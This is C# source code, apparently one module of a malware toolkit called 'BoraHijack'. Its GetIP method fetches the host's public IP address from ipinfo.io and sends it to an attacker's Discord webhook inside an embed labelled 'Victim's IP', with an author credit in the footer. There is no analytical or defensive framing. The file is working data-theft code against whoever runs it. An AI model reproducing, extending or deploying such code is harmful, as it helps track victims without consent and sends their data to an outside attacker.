using System;
using System.IO;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Net.Http;
using Newtonsoft.Json;
using System.Net.Sockets;
using Discord.Webhook;
using Discord;


namespace BoraHijack.Common
{
    public class Data
    {
        public string Ip { get; set; }
    }
    class IPG
    {
        public static async Task GetIP(string webhookUrl)
        {
            string url = "https://ipinfo.io//json";

            using (HttpClient client = new HttpClient())
            {
                try
                {
                    HttpResponseMessage response = await client.GetAsync(url);
                    response.EnsureSuccessStatusCode();
                    string responseData = await response.Content.ReadAsStringAsync();
                    Data idp = JsonConvert.DeserializeObject<Data>(responseData);

                    var cliente = new DiscordWebhookClient(webhookUrl);
                    await cliente.SendMessageAsync(
                        text: $"",
                        username: "BoraHijack",
                        avatarUrl: "https://files.catbox.moe/zteeqk.png",
                        isTTS: false,
                        embeds: new[] { 
                        new EmbedBuilder()
                        .WithTitle("IP Address")
                        .WithDescription($"Victim's IP: {idp.Ip}")
                        .WithFooter("Made By vanity (v1s0or)")
                        .Build() 
                        }
                    );

                    Console.WriteLine(idp.Ip);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                }
            }
        }
    }
}
